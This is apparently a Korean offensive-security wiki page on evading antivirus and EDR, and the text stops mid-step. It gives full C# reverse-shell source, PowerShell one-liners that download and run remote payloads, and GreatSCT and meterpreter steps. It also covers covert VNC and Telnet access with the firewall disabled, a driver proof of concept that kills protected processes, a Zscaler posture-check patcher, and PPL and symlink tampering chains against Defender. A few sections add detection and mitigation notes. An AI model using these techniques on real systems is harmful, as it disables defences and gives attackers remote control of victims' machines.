## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드하여 실행할 때 이 화면을 본 적이 있을 것이다.

Microsoft Defender SmartScreen은 잠재적으로 악성인 애플리케이션의 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘이다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 방식으로 동작한다. 즉, 다운로드가 드문 애플리케이션은 SmartScreen을 유발해 경고를 표시하고 최종 사용자가 파일을 실행하지 못하도록 막는다(하지만 파일은 'More Info -> Run anyway'를 클릭하면 여전히 실행할 수 있다).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> 실행 파일이 **신뢰된** 서명 인증서로 서명되어 있으면 **SmartScreen을 유발하지 않는다**는 점을 기억하는 것이 중요하다.

payloads가 Mark of The Web을 획득하지 못하도록 하는 매우 효과적인 방법은 ISO 같은 컨테이너 안에 패키징하는 것이다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에는 **적용될 수 없다**는 이유 때문이다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

사용 예:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
여기 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 페이로드를 ISO 파일 내부에 패키징하여 SmartScreen을 우회하는 데모가 있습니다

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 애플리케이션과 시스템 구성요소가 **이벤트를 기록**할 수 있게 해주는 Windows의 강력한 로깅 메커니즘입니다. 하지만 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 유저 공간 프로세스의 **`EtwEventWrite`** 함수를 즉시 반환하도록 만들어 해당 프로세스에서 이벤트를 기록하지 않게 할 수도 있습니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하게 함으로써 해당 프로세스의 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 를 참고하세요.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 방법은 오래전부터 알려져 왔으며, AV에 걸리지 않고 포스트-익스플로이테이션 도구를 실행하는 아주 좋은 방법입니다.

페이로드가 디스크에 쓰이지 않고 직접 메모리에 로드되기 때문에, 전체 프로세스에 대해 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(silver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 수행하는 다양한 방법이 있습니다:

- **Fork\&Run**

새로운 희생 프로세스를 **생성(spawn)** 하고, 그 새 프로세스에 포스트-익스플로이테이션 악성 코드를 주입한 뒤 코드를 실행하고 끝나면 그 프로세스를 종료하는 방식입니다. 장단점이 공존합니다. Fork and run 방식의 장점은 실행이 우리 Beacon 임플란트 프로세스 **외부**에서 발생한다는 점입니다. 즉, 포스트-익스플로이테이션 작업 중 문제가 발생하거나 탐지되더라도 우리 **임플란트가 살아남을 확률이 훨씬 높습니다.** 단점은 **행동 기반 탐지(Behavioural Detections)** 에 걸릴 가능성이 더 높다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

포스트-익스플로이테이션 악성 코드를 **자신의 프로세스 내부**에 주입하는 방식입니다. 이렇게 하면 새로운 프로세스를 생성해 AV에 스캔되게 할 필요를 피할 수 있지만, 페이로드 실행 중 문제가 생기면 프로세스가 충돌하여 Beacon을 **잃을 위험이 훨씬 커집니다.**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

[!TIP]
If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

또한 PowerShell에서 C# 어셈블리를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해보세요.

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), 다른 언어들을 사용하여 악성 코드를 실행하는 것이 가능하며, 이는 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 손상된 머신이 접근하도록 허용하는 방식입니다.

SMB 공유에서 Interpreter Binaries와 환경에 대한 접근을 허용하면, 감염된 머신의 메모리 내에서 이러한 언어들로 임의의 코드를 **실행할 수 있습니다**.

리포지토리는 다음과 같이 언급합니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 수 있는 유연성**이 더 커집니다. 이러한 언어들로 작성된 난독화되지 않은 리버스 셸 스크립트를 무작위로 테스트한 결과 성공적인 경우가 있었습니다.

## TokenStomping

Token stomping은 공격자가 액세스 토큰이나 EDR 또는 AV와 같은 보안 제품의 토큰을 **조작**하여 권한을 낮춤으로써 프로세스가 죽지 않지만 악성 활동을 검사할 권한을 가지지 못하게 만드는 기법입니다.

이를 방지하기 위해 Windows는 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻는 것을 **차단**할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), 피해자 PC에 Chrome Remote Desktop을 배포한 뒤 이를 통해 원격 제어 및 지속성을 유지하는 것은 매우 쉽습니다:
1. https://remotedesktop.google.com/에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 MSI 파일을 다운로드합니다.
2. 피해자 측에서 관리자 권한으로 설치 프로그램을 조용히 실행합니다: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가 다음을 클릭합니다. 마법사는 권한 부여를 요청할 것이며, 계속하려면 Authorize 버튼을 클릭합니다.
4. 제공된 파라미터를 약간 조정하여 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI를 사용하지 않고도 PIN을 설정할 수 있게 해주는 pin 파라미터에 주의하세요).

## Advanced Evasion

Evasion은 매우 복잡한 주제입니다. 한 시스템에서 여러 서로 다른 텔레메트리 소스를 고려해야 할 때가 많아, 성숙한 환경에서는 완전히 탐지를 피하는 것이 사실상 불가능합니다.

각 환경은 저마다의 강점과 약점을 가지고 있습니다.

더 고급 회피 기법에 대한 감을 잡고 싶다면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

또한 [@mariuszbit](https://twitter.com/mariuszbit)의 Evasion in Depth에 관한 이 강연도 훌륭합니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 **제거하면서** 어떤 부분을 Defender가 악성으로 판단하는지 찾아내어 분리해줍니다.\
비슷한 기능을 제공하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 웹으로 제공됩니다.

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템 시작 시 **시작**하도록 설정하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (스텔스) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드하세요: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup이 아닌 bin 다운로드를 선택하세요)

**ON THE HOST**: _**winvnc.exe**_를 실행하고 서버를 구성합니다:

- 옵션 _Disable TrayIcon_을 활성화하세요
- _VNC Password_에 비밀번호를 설정하세요
- _View-Only Password_에 비밀번호를 설정하세요

그런 다음, 바이너리 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **victim** 안으로 옮기세요

#### **Reverse connection**

**attacker**는 자신의 **host**에서 바이너리 `vncviewer.exe -listen 5900`를 실행해야 하며, 그래야 reverse **VNC connection**을 수신할 준비가 됩니다. 그런 다음 **victim** 쪽에서는: winvnc 데몬 `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다

**경고:** 은밀함을 유지하려면 다음을 하지 말아야 합니다

- 이미 `winvnc`가 실행 중이면 다시 시작하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 뜹니다. `tasklist | findstr winvnc`로 실행 중인지 확인하세요
- 같은 디렉터리에 `UltraVNC.ini`가 없으면 `winvnc`를 시작하지 마세요. 그러면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
- 도움말을 보려고 `winvnc -h`를 실행하지 마세요. [팝업](https://i.imgur.com/oc18wcu.png)이 뜹니다

### GreatSCT

다음에서 다운로드하세요: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **리스너를 시작**하고 **xml payload**를 **실행**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell 컴파일

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 컴파일러
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 추가

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 종료하기

Storm-2603은 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 이용해 랜섬웨어를 배포하기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 자체적으로 **취약하지만 *서명된* 드라이버**를 포함하고 있으며, 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행합니다.

핵심 요점
1. **Signed driver**: 디스크에 배달되는 파일은 `ServiceMouse.sys`이지만 실제 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버인 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드됩니다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고, 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 사용자 영역에서 접근 가능하게 만듭니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의의 프로세스를 종료 (Defender/EDR 서비스 종료에 사용됨) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD는 사용자 모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *protected* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능과 상관없이 커널 객체를 조작할 수 있습니다.

Detection / Mitigation
• Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys` 로드를 거부하도록 합니다.  
• 새로운 *커널* 서비스 생성 모니터링 및 드라이버가 전 세계 쓰기 가능한 디렉터리에서 로드되었거나 허용 목록에 없는 경우 경보를 발생시킵니다.  
• 사용자 모드 핸들이 커스텀 디바이스 객체에 생성된 후 의심스러운 `DeviceIoControl` 호출이 발생하는지 주시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소로 전달하기 위해 Windows RPC를 사용합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가는 **완전히 클라이언트 측에서만** 수행됩니다 (서버에는 불리언 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행파일이 `WinVerifyTrust`를 통해 **Zscaler에 의해 서명되었는지**만 검증합니다.

디스크 상의 서명된 바이너리 4개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 검사에 대해 규정 준수로 처리됨 |
| `ZSAService.exe` | `WinVerifyTrust`에 대한 간접 호출 | NOP-ed ⇒ 어떤 프로세스(심지어 서명되지 않은 프로세스)도 RPC 파이프에 바인드 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체됨 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 단락 처리되어 우회됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Protected Process Light (PPL) 오용하여 LOLBINs로 AV/EDR 변조하기

Protected Process Light (PPL)은 signer/level 계층을 강제하여 동급 또는 상위 권한을 가진 보호 프로세스만 서로를 변조할 수 있도록 합니다. 공격적으로는, 합법적으로 PPL-enabled binary를 실행하고 그 arguments를 제어할 수 있다면, 정상적인 기능(예: logging)을 AV/EDR에서 사용하는 보호된 디렉토리에 대한 제약된, PPL-backed write primitive로 전환할 수 있습니다.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 프리미티브: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체적으로 프로세스를 생성(self-spawns)하며 호출자가 지정한 경로에 로그 파일을 쓰는 파라미터를 받는다.
- PPL 프로세스로 실행되면 파일 쓰기는 PPL 백킹으로 수행된다.
- ClipUp은 공백이 포함된 경로를 파싱하지 못하므로; 일반적으로 보호된 위치를 가리킬 때는 8.3 단축 경로를 사용하라.

8.3 short path 도우미
- 단축 이름 나열: 각 상위 디렉터리에서 `dir /x`
- cmd에서 단축 경로 추출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

악용 체인 (개요)
1) 런처(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 PPL 지원 LOLBIN(ClipUp)을 실행한다.
2) ClipUp 로그 경로 인수를 전달하여 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성을 강제한다. 필요한 경우 8.3 단축 이름을 사용하라.
3) 대상 바이너리가 AV가 실행 중일 때 일반적으로 열려 있거나 잠겨 있는 경우(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 실행되도록 더 일찍 신뢰성 있게 실행되는 자동 시작 서비스를 설치해 쓰기를 예약하라. Process Monitor(boot logging)로 부팅 순서를 검증하라.
4) 재부팅 시 PPL 백킹된 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해한다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
참고 및 제약사항
- ClipUp가 쓰는 내용은 위치(placement) 외에는 제어할 수 없습니다; 이 프리미티브는 정밀한 내용 주입보다는 변조(corruption)에 적합합니다.
- 서비스를 설치/시작하고 재부팅 기회를 확보하려면 로컬 관리자/SYSTEM 권한이 필요합니다.
- 타이밍이 중요합니다: 대상이 열려 있어서는 안 되며, 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

탐지
- 부팅 시점 전후에 비정상적인 인수로 실행되거나 비표준 런처가 부모인 경우 `ClipUp.exe` 프로세스 생성.
- 자동 시작으로 구성된 새로운 서비스가 의심스러운 바이너리를 시작하고 일관되게 Defender/AV보다 먼저 시작되는 경우. Defender 시작 실패 이전의 서비스 생성/수정 여부를 조사하십시오.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예상치 못한 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 비-AV 바이너리에 의한 비정상적인 PPL 레벨 사용을 확인하십시오.

완화책
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있는지, 어떤 부모 프로세스 아래에서 실행될 수 있는지를 제한하십시오; 합법적인 컨텍스트 외부에서의 ClipUp 호출을 차단하십시오.
- 서비스 위생: 자동 시작 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링하십시오.
- Defender 변조 방지(tamper protection) 및 조기 실행 보호(early-launch protections)가 활성화되어 있는지 확인하고, 바이너리 손상을 나타내는 시작 오류를 조사하십시오.
- 환경과 호환된다면 보안 툴이 위치한 볼륨에서 8.3 short-name 생성 비활성화를 검토하십시오(철저히 테스트할 것).

PPL 및 도구 참고자료
- Microsoft Protected Processes 개요: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU 참조: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon 부팅 로깅(순서 검증): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL 런처: https://github.com/2x7EQ13/CreateProcessAsPPL
- 기술 설명 (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender는 다음 경로 아래의 하위 폴더를 열거하여 실행할 플랫폼을 선택합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 사전순(lexicographic)으로 높은 버전 문자열(예: `4.18.25070.5-0`)을 가진 하위폴더를 선택한 다음 서비스/레지스트리 경로를 업데이트하여 해당 위치에서 Defender 서비스 프로세스를 시작합니다. 이 선택은 디렉터리 항목(디렉터리 재분석 지점 reparse points, symlinks 포함)을 신뢰합니다. 관리자는 이를 이용해 Defender를 공격자가 쓸 수 있는 경로로 리디렉션하고 DLL sideloading 또는 서비스 중단을 달성할 수 있습니다.

전제조건
- 로컬 관리자 권한(Platform 폴더 아래에 디렉터리/심링크를 생성할 수 있어야 함)
- 재부팅하거나 Defender 플랫폼 재선택을 트리거할 수 있는 능력(부팅 시 서비스 재시작)
- 내장 도구만 필요 (mklink)

작동 원리
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, 플랫폼 선택은 디렉터리 항목을 신뢰하며 대상이 보호되거나 신뢰된 경로로 해석되는지 검증하지 않고 사전순으로 가장 높은 버전을 선택합니다.

단계별(예시)
1) 현재 플랫폼 폴더의 쓰기 가능한 복제본을 준비합니다. 예: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
